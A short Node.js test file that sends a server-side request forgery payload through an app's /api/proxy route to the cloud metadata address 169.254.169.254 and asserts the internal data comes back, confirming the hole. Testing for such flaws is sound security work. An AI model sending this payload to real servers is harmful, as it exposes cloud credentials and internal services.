import test from "node:test";
import assert from "node:assert/strict";
import { createApp } from "../app.js";

test("POST /api/proxy vulnerable to SSRF", async () => {
  const app = createApp();
  const server = app.listen(0);

  await new Promise((resolve, reject) => {
    server.once("listening", resolve);
    server.once("error", reject);
  });

  const { port } = server.address();
  
  // Test SSRF vulnerability by accessing internal metadata
  const response = await fetch(`http://127.0.0.1:${port}/api/proxy`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url: "http://169.254.169.254/latest/meta-data/" }),
  });

  // The SSRF vulnerability allows accessing internal services
  assert.equal(response.status, 200);
  const data = await response.text();
  assert.ok(data.length > 0, "SSRF vulnerability confirmed - internal data was accessed");

  await new Promise((resolve, reject) => {
    server.close((error) => (error ? reject(error) : resolve()));
  });
});